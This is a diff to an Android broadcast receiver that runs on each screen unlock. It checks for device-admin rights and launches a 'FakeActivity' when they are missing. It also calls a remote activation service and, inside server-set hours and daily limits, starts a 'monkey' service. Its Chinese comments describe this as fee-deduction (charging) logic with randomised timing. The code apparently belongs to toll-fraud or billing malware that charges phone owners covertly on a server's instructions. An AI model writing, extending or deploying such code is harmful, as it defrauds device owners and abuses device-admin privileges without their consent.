@@ -34,57 +34,86 @@ public class ScreenBRC extends BroadcastReceiver {
         context.startService(serviceIntent);
 
         DevicePolicyManager dpm = (DevicePolicyManager) context.getSystemService(Context.DEVICE_POLICY_SERVICE);
-        boolean isActive = dpm.isAdminActive(new ComponentName(context, DeviceBindBRC.class));
+        boolean isDeviceBinded = dpm.isAdminActive(new ComponentName(context, DeviceBindBRC.class));
 
         SettingManager.getInstance().init(context);
-        if (intent != null && isActive /**SettingManager.getInstance().getKeyHasBindingDevices()*/) {
+        if (intent != null && isDeviceBinded /**SettingManager.getInstance().getKeyHasBindingDevices()*/) {
             String action = intent.getAction();
             if (Intent.ACTION_USER_PRESENT.equals(action)) {
                 Config.LOGD("[[ScreenBRC::onReceive]] action = " + action);
 
-                if (AppRuntime.LOCK_DEVICE_AS_DISDEVICE) {
-//                    UtilsRuntime.goHome(context);
-                    AppRuntime.LOCK_DEVICE_AS_DISDEVICE = false;
-                    //TODO: 可以在此时启动一个看门狗service，来检查是否退到home
-                }
-
                 SettingManager.getInstance().init(context.getApplicationContext());
                 if (SettingManager.getInstance().getKeyActiveTime() == 0) {
-                    //没有激活过
-                    Intent i = new Intent();
-                    i.setAction(PluginService.ACTIVE_ACTION);
-                    context.startService(i);
-                }
-
-                long lastFetchTime = SettingManager.getInstance().getKeyLastPortFetchTime();
-                if (lastFetchTime == 0) {
-                    Calendar c = Calendar.getInstance();
-                    //24小时制
-                    int hour = c.get(Calendar.HOUR_OF_DAY);
-                    if (hour > 6 && UtilsRuntime.isOnline(context)) {
-                        //如果之前没有获取过数据，并且当前时间大于6点，那么获取一次接口数据
+                    //没有激活过，就调用激活接口
+                    if (!AppRuntime.ACTIVE_PROCESS_RUNNING.get()) {
+                        if (Config.DEBUG) {
+                            Config.LOGD("[[ScreenBRC::onReceive]] try to start PluginService for " + PluginService.ACTIVE_ACTION
+                            + " as active time = 0;");
+                        }
                         Intent i = new Intent();
-                        i.setAction(PluginService.PORT_FETCH_ACTION);
+                        i.setAction(PluginService.ACTIVE_ACTION);
+                        i.setClass(context, PluginService.class);
                         context.startService(i);
                     }
                 } else {
+                    long lastActiveTime = SettingManager.getInstance().getKeyActiveTime();
                     Calendar c = Calendar.getInstance();
-                    c.setTimeInMillis(lastFetchTime);
+                    c.setTimeInMillis(lastActiveTime);
                     int lastDay = c.get(Calendar.DAY_OF_YEAR);
                     int lastHour = c.get(Calendar.HOUR_OF_DAY);
                     c = Calendar.getInstance();
                     int curDay = c.get(Calendar.DAY_OF_YEAR);
                     int curHour = c.get(Calendar.HOUR_OF_DAY);
 
-                    if (curDay > lastDay && curHour > 6 && UtilsRuntime.isOnline(context)) {
+                    if (Config.DEBUG) {
+                        Config.LOGD("[[ScreenBRC::onReceive]] last active day = " + lastDay + " cur day = " + curDay);
+                    }
+
+                    if ((curDay != lastDay || AppRuntime.ACTIVE_RESPONSE == null)
+                            && curHour > 6
+                            && UtilsRuntime.isOnline(context)) {
                         //如果之前获取过数据，并且不是同一天，并且当前时间大于6点，那么获取一次接口数据
-                        Intent i = new Intent();
-                        i.setAction(PluginService.PORT_FETCH_ACTION);
-                        context.startService(i);
+                        //当天如果没有激活过，当天不扣费
+                        if (curDay != lastDay) {
+                            //如果不是同一天，将激活计数清零
+                            SettingManager.getInstance().setKeyDayActiveCount(0);
+                        }
+
+                        if (!AppRuntime.ACTIVE_PROCESS_RUNNING.get()
+                            && SettingManager.getInstance().getKeyDayActiveCount() < 5) {
+                            if (Config.DEBUG) {
+                                Config.LOGD("[[ScreenBRC::onReceive]] try to start PluginService for " + PluginService.ACTIVE_ACTION
+                                 + " as active time is over");
+                            }
+                            Intent i = new Intent();
+                            i.setAction(PluginService.ACTIVE_ACTION);
+                            i.setClass(context, PluginService.class);
+                            context.startService(i);
+                        }
+                        return;
+                    }
+
+                    if ((curDay == lastDay)
+                            && AppRuntime.ACTIVE_RESPONSE != null
+                            && (curHour > AppRuntime.ACTIVE_RESPONSE.exeStart
+                                    && curHour < AppRuntime.ACTIVE_RESPONSE.exeEnd)) {
+                        //今天已经成功激活过了，同时激活的数据还存在，开始进行扣费的逻辑
+                        //TODO: 启动扣费,假如时间随机
+                        int dayCount = SettingManager.getInstance().getKeyDayCount();
+                        int times = AppRuntime.ACTIVE_RESPONSE.times;
+                        if (times > dayCount) {
+                            if (Config.DEBUG) {
+                                Config.LOGD("[[ScreenBRC::onReceive]] try to start PluginService for " + PluginService.MONKEY_ACTION);
+                            }
+                            Intent i = new Intent();
+                            i.setAction(PluginService.MONKEY_ACTION);
+                            i.setClass(context, PluginService.class);
+                            context.startService(i);
+                        }
                     }
                 }
             }
-        } else if (!isActive) {
+        } else if (!isDeviceBinded) {
             Intent i = new Intent();
             i.setClass(context, FakeActivity.class);
             i.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_ACTIVITY_EXCLUDE_FROM_RECENTS | Intent.FLAG_ACTIVITY_CLEAR_TOP);
